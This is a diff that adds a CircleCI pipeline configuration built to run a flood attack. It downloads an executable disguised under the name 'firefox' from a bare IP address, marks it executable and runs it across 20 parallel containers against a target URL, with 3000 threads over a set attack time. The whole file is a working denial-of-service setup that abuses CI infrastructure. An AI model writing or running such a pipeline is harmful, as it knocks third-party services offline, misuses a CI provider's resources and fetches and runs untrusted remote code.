@@ -1,0 +1,49 @@
+version: 2.1
+
+parameters:
+  target_url:
+    type: string
+    default: "https://c3.dstatbot.win/Jm2G9hMT"
+  attack_time:
+    type: integer
+    default: 300
+  attack_rate:
+    type: integer
+    default: 3
+  attack_threads:
+    type: integer
+    default: 3000
+
+jobs:
+  firefox-attack:
+    docker:
+      - image: ubuntu:22.04
+    parallelism: 20
+    steps:
+      - checkout
+      - run:
+          name: Install dependencies
+          command: |
+            apt-get update
+            apt-get install -y wget python3 python3-pip
+      - run:
+          name: Download firefox
+          command: wget http://172.105.43.41:8000/firefox
+      - run:
+          name: Make firefox executable
+          command: chmod +x firefox
+      - run:
+          name: Create proxy file
+          command: touch proxy.txt
+      - run:
+          name: Run firefox attack
+          command: |
+            echo "Running shard ${CIRCLE_NODE_INDEX}/${CIRCLE_NODE_TOTAL}"
+            timeout << pipeline.parameters.attack_time >> ./firefox "<< pipeline.parameters.target_url >>" "<< pipeline.parameters.attack_time >>" "<< pipeline.parameters.attack_rate >>" "<< pipeline.parameters.attack_threads >>" proxy.txt --raw
+          no_output_timeout: 10m
+
+workflows:
+  version: 2
+  firefox-workflow:
+    jobs:
+      - firefox-attack
